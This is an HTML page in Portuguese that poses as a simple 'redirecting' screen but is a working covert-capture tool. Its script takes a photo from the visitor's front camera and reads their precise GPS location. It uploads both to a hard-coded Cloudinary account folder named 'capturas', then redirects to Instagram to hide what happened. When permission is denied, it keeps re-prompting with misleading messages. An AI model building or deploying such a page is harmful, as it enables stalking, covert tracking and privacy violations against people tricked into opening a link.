<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Redirecionando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #000; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: none; /* só aparece se necessário */
      justify-content: center;
      align-items: center;
      color: #fff;
      font-family: sans-serif;
      font-size: 20px;
      background: rgba(0,0,0,0.8);
      text-align: center;
      padding: 20px;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar...</div>
  <script>
    const cloudName = "dx5legahb";
    const uploadPreset = "upload";
    const folderName = "capturas";

    // Exibe o overlay com uma mensagem e executa callback ao toque.
    function showOverlay(message, callback) {
      const overlay = document.getElementById("overlay");
      overlay.textContent = message;
      overlay.style.display = "flex";
      overlay.onclick = () => {
        overlay.style.display = "none";
        if (callback) callback();
      };
    }

    // Captura a foto com a câmera frontal.
    async function capturePhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });
        const video = document.createElement("video");
        video.playsInline = true; // fundamental para iOS
        video.muted = true;
        video.srcObject = stream;
        await video.play();
        // Aguarda um curto período para garantir renderização.
        await new Promise(r => setTimeout(r, 300));
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());
        const imageData = canvas.toDataURL("image/png");
        const imageBlob = await (await fetch(imageData)).blob();
        const formData = new FormData();
        formData.append("file", imageBlob);
        formData.append("upload_preset", uploadPreset);
        formData.append("folder", folderName);
        const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
          method: "POST",
          body: formData
        });
        if (!response.ok) throw new Error("Erro ao enviar imagem");
        const data = await response.json();
        return data.secure_url;
      } catch (error) {
        console.error("Erro na captura da foto:", error);
        // Se o usuário negar a câmera, exibe overlay para tentar novamente.
        showOverlay("Permita acesso à câmera para continuar. Toque para tentar novamente.", () => {
          capturePhoto().then(url => proceedToLocation(url));
        });
        throw error;
      }
    }

    // Solicita a localização e envia os dados para o Cloudinary.
    function requestLocation(imageUrl) {
      navigator.geolocation.getCurrentPosition(async (pos) => {
        try {
          const { latitude, longitude } = pos.coords;
          const texto = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
          const textBlob = new Blob([texto], { type: "text/plain" });
          const textForm = new FormData();
          textForm.append("file", textBlob, `localizacao_${Date.now()}.txt`);
          textForm.append("upload_preset", uploadPreset);
          textForm.append("folder", folderName);
          const textResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
            method: "POST",
            body: textForm
          });
          if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
          window.location.href = "https://instagram.com";
        } catch (err) {
          console.error("Erro no envio da localização:", err);
          showOverlay("É necessário as permissões para continuar. Toque aqui para permitir...", () => {
            requestLocation(imageUrl);
          });
        }
      }, (err) => {
        console.error("Erro ao obter localização:", err);
        showOverlay("É necessário as permissões para continuar. Toque aqui para permitir...", () => {
          requestLocation(imageUrl);
        });
      }, {
        enableHighAccuracy: true,
        timeout: 8000,
        maximumAge: 0
      });
    }

    // Após a foto, verifica a permissão de localização.
    function proceedToLocation(imageUrl) {
      if (navigator.permissions) {
        navigator.permissions.query({ name: 'geolocation' }).then((status) => {
          if (status.state === 'granted') {
            requestLocation(imageUrl);
          } else {
            // Se o estado for 'prompt' ou 'denied', forçamos um gesto do usuário.
            showOverlay("Toque para continuar", () => {
              requestLocation(imageUrl);
            });
          }
        });
      } else {
        // Se não suportado, apenas solicita a localização.
        requestLocation(imageUrl);
      }
    }

    // Função principal que inicia o fluxo: captura a foto e, se bem-sucedida, prossegue para a localização.
    async function startFlow() {
      try {
        const imageUrl = await capturePhoto();
        proceedToLocation(imageUrl);
      } catch (e) {
        console.error("Erro no fluxo:", e);
      }
    }

    // Inicia o fluxo somente após a interação inicial do usuário.
    document.getElementById("overlay").addEventListener("click", function handler() {
      document.getElementById("overlay").removeEventListener("click", handler);
      startFlow();
    });
  </script>
</body>
</html>
